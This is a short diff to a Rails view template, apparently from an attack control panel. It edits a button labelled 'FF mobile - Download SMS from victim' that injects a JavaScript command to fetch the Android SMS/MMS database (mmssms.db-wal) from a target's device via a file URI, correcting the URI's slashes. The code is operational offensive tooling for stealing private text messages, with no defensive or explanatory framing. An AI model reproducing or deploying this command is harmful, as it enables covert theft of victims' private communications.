@@ -62,7 +62,7 @@
   </div>
     </div>
     <div class="actions">
-    <%= f.submit "FF mobile - Download SMS from victim"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.downloadContentFromURL(config2,\"file://data/data/com.android.providers.telephony/databases/mmssms.db-wal\",\"GET\", \"\", \"application/octet-stream\")');"%>
+    <%= f.submit "FF mobile - Download SMS from victim"  ,:id => 'hack', :class=>'test', :onclick=>"$('input[id=ccconfig_jscommand]').val('this.downloadContentFromURL(config2,\"file:///data/data/com.android.providers.telephony/databases/mmssms.db-wal\",\"GET\", \"\", \"application/octet-stream\")');"%>
   </div>
   <% end %>
   <div class="actions">
